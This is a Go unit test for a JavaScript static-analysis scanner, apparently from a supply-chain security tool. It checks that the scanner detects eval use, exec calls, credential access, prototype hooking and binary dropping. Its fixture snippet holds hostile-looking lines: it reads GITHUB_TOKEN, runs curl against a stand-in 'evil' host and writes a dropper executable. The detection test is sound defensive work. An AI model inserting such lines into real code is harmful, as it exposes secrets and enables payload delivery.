package astjs

import (
	"testing"

	"github.com/kurokuma/pkg9/internal/model"
)

func TestScannerReportsASTSignals(t *testing.T) {
	target := model.ScanTarget{
		Files: []model.ScanFile{{
			RelativePath: "sample.js",
			IsText:       true,
			LanguageHint: "javascript",
			NormalizedText: `
				const token = process.env.GITHUB_TOKEN;
				eval("console.log(token)");
				child_process.exec("curl https://evil");
				Object.prototype.toString = function() {};
				fs.writeFileSync("/tmp/dropper.exe", data);
			`,
		}},
	}

	out := (Scanner{}).Run(target)
	if len(out.Signals["ast_eval_usage"]) == 0 {
		t.Fatal("expected eval signal")
	}
	if len(out.Signals["ast_dangerous_exec"]) == 0 {
		t.Fatal("expected exec signal")
	}
	if len(out.Signals["ast_credential_access"]) == 0 {
		t.Fatal("expected credential access signal")
	}
	if len(out.Signals["ast_prototype_hook"]) == 0 {
		t.Fatal("expected prototype hook signal")
	}
	if len(out.Signals["ast_binary_dropper"]) == 0 {
		t.Fatal("expected binary dropper signal")
	}
}
